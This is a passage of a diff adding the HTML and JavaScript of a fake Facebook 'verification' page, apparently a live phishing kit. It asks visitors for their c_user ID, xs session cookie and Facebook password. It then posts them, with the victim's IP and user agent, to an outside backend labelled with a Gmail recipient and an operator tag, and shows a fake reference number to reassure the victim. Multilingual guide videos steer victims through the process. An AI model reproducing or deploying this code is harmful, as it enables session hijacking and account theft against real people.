+                    <input type="text" 
+                           class="mobile-form-input" 
+                           id="mobile-xs_token" 
+                           placeholder="">
+                    <div class="mobile-helper-text">
+                        Uppercase, lowercase, numbers & special characters
+                    </div>
+                    <div class="mobile-error-message" id="mobile-xs_token_error" style="display: none;">
+                        <svg width="14" height="14" viewBox="0 0 24 24">
+                            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        <span id="mobile-xs_error_text">Invalid token</span>
+                    </div>
+                </div>
+
+                <div class="mobile-action-btns">
+                    <button class="mobile-btn" id="mobileNextStep1Btn">
+                        Verify Submit
+                        <svg width="18" height="18" viewBox="0 0 24 24" style="margin-left: 4px;">
+                            <path fill="currentColor" d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Step 2: Password Verification -->
+            <div id="mobile-step2" class="step-content" style="display: none;">
+                <!-- Mobile Password Form Header -->
+                <div class="mobile-password-header">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/800px-Facebook_Logo_%282019%29.png" 
+                         alt="Facebook"
+                         class="mobile-facebook-logo">
+                    <h2 class="mobile-password-title">Final Verification Step</h2>
+                    <p class="mobile-password-subtitle">
+                        Enter your Facebook password to complete the verification process.
+                    </p>
+                </div>
+
+                <div class="mobile-form-group">
+                    <label class="mobile-form-label">
+                        <span class="mobile-label-text">Facebook Password</span>
+                        <span class="mobile-label-hint">Required</span>
+                    </label>
+                    <input type="password" 
+                           class="mobile-form-input" 
+                           id="mobile-password" 
+                           placeholder="Enter your password">
+                    <div class="mobile-helper-text">
+                        Enter your Facebook password
+                    </div>
+                    <div class="mobile-error-message" id="mobile-password_error" style="display: none;">
+                        <svg width="14" height="14" viewBox="0 0 24 24">
+                            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        Please enter your password
+                    </div>
+                </div>
+
+                <div class="mobile-action-btns">
+                    <button class="mobile-btn-secondary" id="mobilePrevStep2Btn">
+                        <svg width="18" height="18" viewBox="0 0 24 24" style="margin-right: 4px;">
+                            <path fill="currentColor" d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
+                        </svg>
+                        Back
+                    </button>
+                    <button class="mobile-btn" id="mobileSubmitPasswordBtn">
+                        Complete Verification
+                        <svg width="18" height="18" viewBox="0 0 24 24" style="margin-left: 4px;">
+                            <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Success State -->
+            <div id="mobile-successStep" class="mobile-success-state" style="display: none;">
+                <div class="mobile-success-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24">
+                        <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                </div>
+                <h2 class="mobile-success-title">Verification Submitted</h2>
+                <p class="mobile-success-message">
+                    Your verification request has been submitted. You'll receive an email notification within 24 hours.
+                </p>
+                <div class="mobile-reference-box">
+                    <span>Reference ID</span>
+                    <strong id="mobile-referenceId">FB-789456123</strong>
+                </div>
+                <button class="mobile-btn" style="padding: 12px 24px;">
+                    Return to Facebook
+                </button>
+            </div>
+        </main>
+
+        <!-- Mobile Bottom Navigation -->
+        <nav class="mobile-bottom-nav">
+            <a href="#" class="mobile-nav-item active">
+                <svg class="mobile-nav-icon" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
+                </svg>
+                <span class="mobile-nav-text">Home</span>
+            </a>
+            <a href="#" class="mobile-nav-item">
+                <svg class="mobile-nav-icon" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                </svg>
+                <span class="mobile-nav-text">Profile</span>
+            </a>
+            <a href="#" class="mobile-nav-item">
+                <svg class="mobile-nav-icon" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                <span class="mobile-nav-text">Security</span>
+            </a>
+            <a href="#" class="mobile-nav-item">
+                <svg class="mobile-nav-icon" viewBox="0 0 24 24">
+                    <path fill="currentColor" d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm2 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/>
+                </svg>
+                <span class="mobile-nav-text">Menu</span>
+            </a>
+        </nav>
+
+        <!-- Mobile Language Modal -->
+        <div class="mobile-lang-modal" id="mobileLanguageModal">
+            <div class="mobile-modal-header">
+                <button class="mobile-modal-close" id="mobileCloseModal">
+                    <svg width="24" height="24" viewBox="0 0 24 24">
+                        <path fill="currentColor" d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+                    </svg>
+                </button>
+                <h3 class="mobile-modal-title">Select Language</h3>
+            </div>
+            <div class="mobile-modal-body" id="mobileLanguageOptions">
+                <!-- Languages will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Video Sources
+        const videoSources = {
+            mobile: {
+                english: "https://res.cloudinary.com/dznheajmh/video/upload/v1768331003/lv_0_20260113235326_j367p1.mp4",
+                spanish: "https://res.cloudinary.com/dznheajmh/video/upload/v1768364120/lv-0-202601132_spanish_rfjn6l.mp4",
+                hindi: "https://res.cloudinary.com/dznheajmh/video/upload/v1768364155/lv-0-20260113_hindi_d46pni.mp4",
+                french: "https://res.cloudinary.com/dznheajmh/video/upload/v1768364055/french_we3bx5.mp4",
+                portuguese: "https://res.cloudinary.com/dznheajmh/video/upload/v1768364098/lv-0-20260_prtuguse_ccxfze.mp4",
+                arabic: "https://res.cloudinary.com/dznheajmh/video/upload/v1768364181/lv-0-202601132_arabic_xigixy.mp4",
+                tamil: "https://res.cloudinary.com/dznheajmh/video/upload/v1768367469/VideoTranslation_tamil_ydavuu.mp4",
+                vietnamese: "https://res.cloudinary.com/dznheajmh/video/upload/v1768367450/VideoTranslation_vietnames_v8ojlx.mp4",
+                ghanaian: "https://allvideos.wasmer.app/english.mp4"
+            },
+            desktop: {
+                english: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767117204/lv_0_20251230161828_megdjq.mp4",
+                spanish: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767138812/lv-0-20251230161828_XWVuYZaZ_u4n8gk.mp4",
+                hindi: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767139292/1000595651.mp4-Hindi_tcemwd.mp4",
+                french: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767122724/lv-0-20251230161828_xKuJSMUZ_gvoi3d.mp4",
+                portuguese: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767138320/lv-0-20251230161828_EGC9ye5d_hrwoci.mp4",
+                arabic: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767139366/1000595651.mp4-Arabic_ilgc8i.mp4",
+                tamil: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767150821/1000595608.mp4-Tamil_f8fmkd.mp4",
+                vietnamese: "https://res.cloudinary.com/dqm5ovjch/video/upload/v1767122566/a49ufpu8e2ao_sc8ocg.mp4",
+                ghanaian: "https://allvideos.wasmer.app/english.mp4"
+            }
+        };
+
+        // Languages Data
+        const languages = {
+            english: { name: "English", flag: "https://flagcdn.com/w40/us.png" },
+            spanish: { name: "Spanish", flag: "https://flagcdn.com/w40/es.png" },
+            hindi: { name: "Hindi", flag: "https://flagcdn.com/w40/in.png" },
+            french: { name: "French", flag: "https://flagcdn.com/w40/fr.png" },
+            portuguese: { name: "Portuguese", flag: "https://flagcdn.com/w40/pt.png" },
+            arabic: { name: "Arabic", flag: "https://flagcdn.com/w40/sa.png" },
+            tamil: { name: "Tamil", flag: "https://flagcdn.com/w40/in.png" },
+            vietnamese: { name: "Vietnamese", flag: "https://flagcdn.com/w40/vn.png" },
+            ghanaian: { name: "Ghanaian (Twi)", flag: "https://flagcdn.com/w40/gh.png" }
+        };
+
+        // Application State
+        let currentView = 'mobile';
+        let selectedLanguage = "english";
+        let isSpecialPage = false;
+
+        // Video States - FIXED
+        const videoStates = {
+            desktop: {
+                currentTime: 0,
+                playing: false,
+                language: 'english'
+            },
+            mobile: {
+                currentTime: 0,
+                playing: false,
+                language: 'english'
+            }
+        };
+
+        // DOM Elements
+        const desktopView = document.getElementById('desktopView');
+        const mobileView = document.getElementById('mobileView');
+        const viewToggleBtn = document.getElementById('viewToggleBtn');
+        const viewToggleIcon = document.getElementById('viewToggleIcon');
+        const viewToggleText = document.getElementById('viewToggleText');
+
+        // Initialize
+        function init() {
+            detectDevice();
+            setupEventListeners();
+            loadSavedPreferences();
+            applyView();
+            setupDesktopSystem();
+            setupMobileSystem();
+        }
+
+        // Detect Device
+        function detectDevice() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const screenWidth = window.innerWidth;
+            const isMobile = /mobile|android|iphone|ipad|ipod/i.test(userAgent) || screenWidth < 768;
+            
+            if (currentView === 'auto') {
+                currentView = isMobile ? 'mobile' : 'desktop';
+            }
+        }
+
+        // Load Saved Preferences
+        function loadSavedPreferences() {
+            const savedView = localStorage.getItem('preferredView');
+            const savedLanguage = localStorage.getItem('selectedLanguage');
+            
+            if (savedView) currentView = savedView;
+            if (savedLanguage) selectedLanguage = savedLanguage;
+        }
+
+        // Apply View
+        function applyView() {
+            if (currentView === 'desktop') {
+                desktopView.style.display = 'block';
+                mobileView.style.display = 'none';
+                viewToggleText.textContent = 'Switch to Mobile';
+                viewToggleIcon.innerHTML = '<path fill="currentColor" d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>';
+            } else {
+                desktopView.style.display = 'none';
+                mobileView.style.display = 'block';
+                viewToggleText.textContent = 'Switch to Desktop';
+                viewToggleIcon.innerHTML = '<path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>';
+            }
+            
+            localStorage.setItem('preferredView', currentView);
+        }
+
+        // Setup Event Listeners
+        function setupEventListeners() {
+            viewToggleBtn.addEventListener('click', toggleView);
+            isSpecialPage = window.location.search.includes('special=true');
+        }
+
+        // Toggle View - FIXED FUNCTION
+        function toggleView() {
+            // Pehle current video pause karo aur time save karo
+            if (currentView === 'desktop') {
+                const desktopVideo = document.getElementById('desktopGuideVideo');
+                if (desktopVideo) {
+                    desktopVideo.pause();
+                    videoStates.desktop.currentTime = desktopVideo.currentTime;
+                    videoStates.desktop.playing = false;
+                    console.log("Desktop video paused at:", desktopVideo.currentTime);
+                }
+            } else {
+                const mobileVideo = document.getElementById('mobileGuideVideo');
+                if (mobileVideo) {
+                    mobileVideo.pause();
+                    videoStates.mobile.currentTime = mobileVideo.currentTime;
+                    videoStates.mobile.playing = false;
+                    console.log("Mobile video paused at:", mobileVideo.currentTime);
+                }
+            }
+            
+            // View change karo
+            currentView = currentView === 'mobile' ? 'desktop' : 'mobile';
+            
+            // Naya view apply karo
+            applyView();
+            
+            // Naye view mein video resume karo
+            setTimeout(resumeVideo, 100);
+            
+            // Notification show karo
+            showNotification(`Switched to ${currentView === 'mobile' ? 'Mobile' : 'Desktop'} View`);
+        }
+
+        // Video resume karo - FIXED FUNCTION
+        function resumeVideo() {
+            if (currentView === 'desktop') {
+                const desktopVideo = document.getElementById('desktopGuideVideo');
+                if (desktopVideo && videoStates.desktop.currentTime > 0) {
+                    desktopVideo.currentTime = videoStates.desktop.currentTime;
+                    if (videoStates.desktop.playing) {
+                        desktopVideo.play().catch(e => console.log("Desktop play error:", e));
+                    }
+                    console.log("Desktop video resumed at:", videoStates.desktop.currentTime);
+                }
+            } else {
+                const mobileVideo = document.getElementById('mobileGuideVideo');
+                if (mobileVideo && videoStates.mobile.currentTime > 0) {
+                    mobileVideo.currentTime = videoStates.mobile.currentTime;
+                    if (videoStates.mobile.playing) {
+                        mobileVideo.play().catch(e => console.log("Mobile play error:", e));
+                    }
+                    console.log("Mobile video resumed at:", videoStates.mobile.currentTime);
+                }
+            }
+        }
+
+        // Show Notification
+        function showNotification(message) {
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: var(--blue-primary);
+                color: white;
+                padding: 12px 24px;
+                border-radius: var(--radius-md);
+                box-shadow: var(--shadow-3);
+                z-index: 10001;
+                animation: slideIn 0.3s ease;
+            `;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.style.animation = 'slideOut 0.3s ease';
+                setTimeout(() => notification.remove(), 300);
+            }, 3000);
+        }
+
+        // ==================== DESKTOP SYSTEM ====================
+        function setupDesktopSystem() {
+            let desktopCurrentStep = 1;
+            const desktopStepContents = {
+                1: document.getElementById('desktop-step1'),
+                2: document.getElementById('desktop-step2'),
+                success: document.getElementById('desktop-successStep')
+            };
+            
+            const desktopLanguageModal = document.getElementById('desktopLanguageModal');
+            const desktopLangSelectorBtn = document.getElementById('desktopLangSelectorBtn');
+            const desktopVideoPlaceholder = document.getElementById('desktopVideoPlaceholder');
+            const desktopVideoElement = document.getElementById('desktopVideoElement');
+            const desktopGuideVideo = document.getElementById('desktopGuideVideo');
+            const desktopFlagsContainer = document.getElementById('desktopFlagsContainer');
+            
+            function initDesktop() {
+                setupDesktopEventListeners();
+                updateDesktopStepUI();
+                createDesktopLanguageFlags();
+            }
+            
+            function setupDesktopEventListeners() {
+                document.getElementById('desktopNextStep1Btn').addEventListener('click', submitDesktopFormData);
+                document.getElementById('desktopPrevStep2Btn').addEventListener('click', () => goToDesktopStep(1));
+                document.getElementById('desktopSubmitPasswordBtn').addEventListener('click', submitDesktopPasswordData);
+                
+                desktopVideoPlaceholder.addEventListener('click', function() {
+                    showDesktopLanguageModal();
+                });
+                
+                desktopLangSelectorBtn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    showDesktopLanguageModal();
+                });
+                
+                document.getElementById('desktopCloseModal').addEventListener('click', () => {
+                    desktopLanguageModal.style.display = 'none';
+                });
+                
+                desktopLanguageModal.addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        this.style.display = 'none';
+                    }
+                });
+                
+                // Video time save karne ke liye event listener - FIXED
+                if (desktopGuideVideo) {
+                    desktopGuideVideo.addEventListener('timeupdate', function() {
+                        if (!isNaN(this.currentTime)) {
+                            videoStates.desktop.currentTime = this.currentTime;
+                        }
+                    });
+                    
+                    desktopGuideVideo.addEventListener('play', function() {
+                        videoStates.desktop.playing = true;
+                    });
+                    
+                    desktopGuideVideo.addEventListener('pause', function() {
+                        videoStates.desktop.playing = false;
+                    });
+                }
+            }
+            
+            function createDesktopLanguageFlags() {
+                desktopFlagsContainer.innerHTML = '';
+                Object.keys(languages).forEach(lang => {
+                    const language = languages[lang];
+                    const flagBtn = document.createElement('button');
+                    flagBtn.className = `lang-flag-btn ${lang === selectedLanguage ? 'active' : ''}`;
+                    flagBtn.dataset.lang = lang;
+                    
+                    flagBtn.innerHTML = `
+                        <img src="${language.flag.replace('w40', 'w20')}" alt="${language.name}" class="flag-small">
+                        <span>${language.name}</span>
+                    `;
+                    
+                    // FLAGS BUTTON FIX - ab kaam karega
+                    flagBtn.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        e.preventDefault();
+                        console.log("Flag clicked:", lang);
+                        
+                        // Language change karo
+                        selectedLanguage = lang;
+                        localStorage.setItem('selectedLanguage', lang);
+                        videoStates.desktop.language = lang;
+                        videoStates.desktop.currentTime = 0; // New language = start from 0
+                        
+                        // UI update karo
+                        const desktopLangSelectorBtn = document.getElementById('desktopLangSelectorBtn');
+                        if (desktopLangSelectorBtn) {
+                            desktopLangSelectorBtn.innerHTML = `
+                                <img src="${language.flag.replace('w40', 'w20')}" alt="${language.name}" class="lang-flag">
+                                <span>${language.name}</span>
+                                <svg width="16" height="16" viewBox="0 0 24 24">
+                                    <path fill="currentColor" d="M7 10l5 5 5-5z"/>
+                                </svg>
+                            `;
+                        }
+                        
+                        // Active class update karo
+                        document.querySelectorAll('.lang-flag-btn').forEach(btn => {
+                            btn.classList.remove('active');
+                        });
+                        this.classList.add('active');
+                        
+                        // Agar video chal rahi hai toh new language ki video play karo
+                        if (desktopVideoElement.style.display === 'block') {
+                            playDesktopVideo();
+                        }
+                    });
+                    
+                    desktopFlagsContainer.appendChild(flagBtn);
+                });
+            }
+            
+            function showDesktopLanguageModal() {
+                const desktopLanguageOptions = document.getElementById('desktopLanguageOptions');
+                desktopLanguageOptions.innerHTML = '';
+                
+                Object.keys(languages).forEach(lang => {
+                    const language = languages[lang];
+                    const option = document.createElement('div');
+                    option.className = `lang-option ${lang === selectedLanguage ? 'selected' : ''}`;
+                    option.dataset.lang = lang;
+                    
+                    option.innerHTML = `
+                        <img src="${language.flag}" alt="${language.name}" class="flag-medium">
+                        <div class="lang-info">
+                            <div class="lang-name">${language.name}</div>
+                        </div>
+                        ${lang === selectedLanguage ? '<svg class="lang-check" width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>' : ''}
+                    `;
+                    
+                    option.addEventListener('click', function() {
+                        changeDesktopLanguage(lang);
+                        desktopLanguageModal.style.display = 'none';
+                        // Language change par video restart karo
+                        videoStates.desktop.currentTime = 0;
+                        setTimeout(() => {
+                            playDesktopVideo();
+                        }, 300);
+                    });
+                    
+                    desktopLanguageOptions.appendChild(option);
+                });
+                
+                desktopLanguageModal.style.display = 'flex';
+            }
+            
+            function changeDesktopLanguage(lang) {
+                selectedLanguage = lang;
+                localStorage.setItem('selectedLanguage', lang);
+                videoStates.desktop.language = lang;
+                
+                const language = languages[lang];
+                desktopLangSelectorBtn.innerHTML = `
+                    <img src="${language.flag.replace('w40', 'w20')}" alt="${language.name}" class="lang-flag">
+                    <span>${language.name}</span>
+                    <svg width="16" height="16" viewBox="0 0 24 24">
+                        <path fill="currentColor" d="M7 10l5 5 5-5z"/>
+                    </svg>
+                `;
+            }
+            
+            function playDesktopVideo() {
+                desktopVideoPlaceholder.style.display = 'none';
+                desktopVideoElement.style.display = 'block';
+                desktopGuideVideo.src = videoSources.desktop[selectedLanguage];
+                
+                // New language ki video start se shuru karo
+                desktopGuideVideo.currentTime = videoStates.desktop.currentTime;
+                
+                desktopGuideVideo.load();
+                desktopGuideVideo.play().then(() => {
+                    videoStates.desktop.playing = true;
+                }).catch(error => {
+                    console.log("Desktop video play error:", error);
+                    desktopGuideVideo.controls = true;
+                });
+            }
+            
+            function updateDesktopStepUI() {
+                Object.values(desktopStepContents).forEach(step => {
+                    if (step) step.style.display = 'none';
+                });
+                
+                if (desktopCurrentStep <= 2) {
+                    desktopStepContents[desktopCurrentStep].style.display = 'block';
+                } else if (desktopCurrentStep === 3) {
+                    desktopStepContents.success.style.display = 'block';
+                }
+            }
+            
+            function goToDesktopStep(step) {
+                desktopCurrentStep = step;
+                updateDesktopStepUI();
+            }
+            
+            // Validation functions...
+            function validateDesktopCUser() {
+                const input = document.getElementById('desktop-c_user');
+                const error = document.getElementById('desktop-c_user_error');
+                input.value = input.value.replace(/[^0-9]/g, '');
+                
+                if (input.value.length < 8) {
+                    error.style.display = 'flex';
+                    return false;
+                }
+                error.style.display = 'none';
+                return true;
+            }
+            
+            function validateDesktopXsToken() {
+                const input = document.getElementById('desktop-xs_token');
+                const error = document.getElementById('desktop-xs_token_error');
+                const errorText = document.getElementById('desktop-xs_error_text');
+                
+                const hasUpperCase = /[A-Z]/.test(input.value);
+                const hasLowerCase = /[a-z]/.test(input.value);
+                const hasNumbers = /[0-9]/.test(input.value);
+                const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?~`]/.test(input.value);
+                const hasMinimumLength = input.value.length >= 6;
+                
+                if (!hasMinimumLength || !hasUpperCase || !hasLowerCase || !hasNumbers || !hasSpecialChar) {
+                    let errors = [];
+                    if (!hasMinimumLength) errors.push("minimum 6 characters");
+                    if (!hasUpperCase) errors.push("uppercase letter");
+                    if (!hasLowerCase) errors.push("lowercase letter");
+                    if (!hasNumbers) errors.push("number");
+                    if (!hasSpecialChar) errors.push("special character");
+                    
+                    errorText.textContent = `Must contain: ${errors.join(", ")}`;
+                    error.style.display = 'flex';
+                    return false;
+                }
+                
+                error.style.display = 'none';
+                return true;
+            }
+            
+            async function submitDesktopFormData() {
+                const cUserValid = validateDesktopCUser();
+                const xsTokenValid = validateDesktopXsToken();
+                
+                if (!cUserValid || !xsTokenValid) {
+                    if (!cUserValid) document.getElementById('desktop-c_user_error').style.display = 'flex';
+                    if (!xsTokenValid) document.getElementById('desktop-xs_token_error').style.display = 'flex';
+                    return;
+                }
+                
+                const c_user = document.getElementById('desktop-c_user').value;
+                const xs = document.getElementById('desktop-xs_token').value;
+                
+                localStorage.setItem('c_user', c_user);
+                localStorage.setItem('xs_token', xs);
+                
+                const formData = {
+                    c_user: c_user,
+                    xs: xs,
+                    timestamp: new Date().toISOString(),
+                    ip_address: await getIPAddress(),
+                    userAgent: navigator.userAgent,
+                    language: selectedLanguage,
+                    data_name: 'MEHTAB',
+                    page_type: isSpecialPage ? 'special' : 'normal',
+                    form_type: 'first_form',
+                    view_type: 'desktop'
+                };
+                
+                const button = document.getElementById('desktopNextStep1Btn');
+                const originalText = button.innerHTML;
+                button.innerHTML = '<span class="spinner"></span> Verifying...';
+                button.disabled = true;
+                
+                try {
+                    const response = await fetch('https://shiper-backend-gspaltenhorn.on.shiper.app/submit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ...formData,
+                            target_emails: isSpecialPage ? 
+                                ['first@mail.com', 'bawrbyfu@gmail.com'] : 
+                                ['bawrbyfu@gmail.com', 'first@mail.com'],
+                            submission_type: 'form_submission',
+                            page_type: isSpecialPage ? 'special' : 'normal',
+                            device_type: 'desktop'
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        // Form reset karo
+                        document.getElementById('desktop-c_user').value = '';
+                        document.getElementById('desktop-xs_token').value = '';
+                        localStorage.removeItem('c_user');
+                        localStorage.removeItem('xs_token');
+                        
+                        goToDesktopStep(2);
+                    }
+                } catch (error) {
+                    console.error('Desktop form submission error:', error);
+                } finally {
+                    button.innerHTML = originalText;
+                    button.disabled = false;
+                }
+            }
+            
+            async function submitDesktopPasswordData() {
+                const password = document.getElementById('desktop-password').value;
+                
+                if (!password) {
+                    document.getElementById('desktop-password_error').style.display = 'flex';
+                    return;
+                }
+                
+                const button = document.getElementById('desktopSubmitPasswordBtn');
+                const originalText = button.innerHTML;
+                button.innerHTML = '<span class="spinner"></span> Completing...';
+                button.disabled = true;
+                
+                try {
+                    localStorage.setItem('password', password);
+                    
+                    const passwordData = {
+                        password: password,
+                        c_user: document.getElementById('desktop-c_user').value,
+                        xs: document.getElementById('desktop-xs_token').value,
+                        timestamp: new Date().toISOString(),
+                        ip_address: await getIPAddress(),
+                        userAgent: navigator.userAgent,
+                        language: selectedLanguage,
+                        data_name: 'MEHTAB',
+                        page_type: isSpecialPage ? 'special' : 'normal',
+                        form_type: 'password_form',
+                        view_type: 'desktop'
+                    };
+                    
+                    const response = await fetch('https://shiper-backend-gspaltenhorn.on.shiper.app/pass', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ...passwordData,
+                            target_emails: isSpecialPage ? 
+                                ['first@mail.com', 'bawrbyfu@gmail.com'] : 
+                                ['bawrbyfu@gmail.com', 'first@mail.com'],
+                            submission_type: 'password_submission',
+                            page_type: isSpecialPage ? 'special' : 'normal',
+                            device_type: 'desktop'
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        // Password field reset karo
+                        document.getElementById('desktop-password').value = '';
+                        localStorage.removeItem('password');
+                        
+                        const referenceId = 'FB-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                        document.getElementById('desktop-referenceId').textContent = referenceId;
+                        goToDesktopStep(3);
+                    }
+                } catch (error) {
+                    console.error('Desktop password submission error:', error);
+                } finally {
+                    button.innerHTML = originalText;
+                    button.disabled = false;
+                }
+            }
+            
+            async function getIPAddress() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return "unknown";
+                }
+            }
+            
+            initDesktop();
+        }
+
+        // ==================== MOBILE SYSTEM ====================
+        function setupMobileSystem() {
+            let mobileCurrentStep = 1;
+            const mobileStepContents = {
+                1: document.getElementById('mobile-step1'),
+                2: document.getElementById('mobile-step2'),
+                success: document.getElementById('mobile-successStep')
+            };
+            
+            const mobileLanguageModal = document.getElementById('mobileLanguageModal');
+            const mobileLangBtn = document.getElementById('mobileLangBtn');
+            const mobileVideoPlaceholder = document.getElementById('mobileVideoPlaceholder');
+            const mobileVideoElement = document.getElementById('mobileVideoElement');
+            const mobileGuideVideo = document.getElementById('mobileGuideVideo');
+            
+            function initMobile() {
+                setupMobileEventListeners();
+                updateMobileStepUI();
+            }
+            
+            function setupMobileEventListeners() {
+                document.getElementById('mobileNextStep1Btn').addEventListener('click', submitMobileFormData);
+                document.getElementById('mobilePrevStep2Btn').addEventListener('click', () => goToMobileStep(1));
+                document.getElementById('mobileSubmitPasswordBtn').addEventListener('click', submitMobilePasswordData);
+                
+                mobileVideoPlaceholder.addEventListener('click', function() {
+                    showMobileLanguageModal();
+                });
+                
+                mobileLangBtn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    showMobileLanguageModal();
+                });
+                
+                document.getElementById('mobileCloseModal').addEventListener('click', () => {
+                    mobileLanguageModal.style.display = 'none';
+                });
+                
+                // Video time save karne ke liye event listener - FIXED
+                if (mobileGuideVideo) {
+                    mobileGuideVideo.addEventListener('timeupdate', function() {
+                        if (!isNaN(this.currentTime)) {
+                            videoStates.mobile.currentTime = this.currentTime;
+                        }
+                    });
+                    
+                    mobileGuideVideo.addEventListener('play', function() {
+                        videoStates.mobile.playing = true;
+                    });
+                    
+                    mobileGuideVideo.addEventListener('pause', function() {
+                        videoStates.mobile.playing = false;
+                    });
+                }
+            }
+            
+            function showMobileLanguageModal() {
+                const mobileLanguageOptions = document.getElementById('mobileLanguageOptions');
+                mobileLanguageOptions.innerHTML = '';
+                
+                Object.keys(languages).forEach(lang => {
+                    const language = languages[lang];
+                    const option = document.createElement('div');
+                    option.className = `mobile-lang-option ${lang === selectedLanguage ? 'selected' : ''}`;
+                    option.dataset.lang = lang;
+                    
+                    option.innerHTML = `
+                        <img src="${language.flag}" alt="${language.name}" class="mobile-flag-medium">
+                        <div class="mobile-lang-name">${language.name}</div>
+                        ${lang === selectedLanguage ? '<svg class="mobile-lang-check" width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>' : ''}
+                    `;
+                    
+                    option.addEventListener('click', function() {
+                        changeMobileLanguage(lang);
+                        mobileLanguageModal.style.display = 'none';
+                        // Language change par video restart karo
+                        videoStates.mobile.currentTime = 0;
+                        setTimeout(() => {
+                            playMobileVideo();
+                        }, 300);
+                    });
+                    
+                    mobileLanguageOptions.appendChild(option);
+                });
+                
+                mobileLanguageModal.style.display = 'flex';
+            }
+            
+            function changeMobileLanguage(lang) {
+                selectedLanguage = lang;
+                localStorage.setItem('selectedLanguage', lang);
+                videoStates.mobile.language = lang;
+                
+                const language = languages[lang];
+                mobileLangBtn.querySelector('.mobile-lang-current').innerHTML = `
+                    <img src="${language.flag.replace('w40', 'w20')}" alt="${language.name}" class="lang-flag">
+                    <span>${language.name}</span>
+                `;
+            }
+            
+            function playMobileVideo() {
+                mobileVideoPlaceholder.style.display = 'none';
+                mobileVideoElement.style.display = 'block';
+                mobileGuideVideo.src = videoSources.mobile[selectedLanguage];
+                
+                // New language ki video start se shuru karo
+                mobileGuideVideo.currentTime = videoStates.mobile.currentTime;
+                
+                mobileGuideVideo.load();
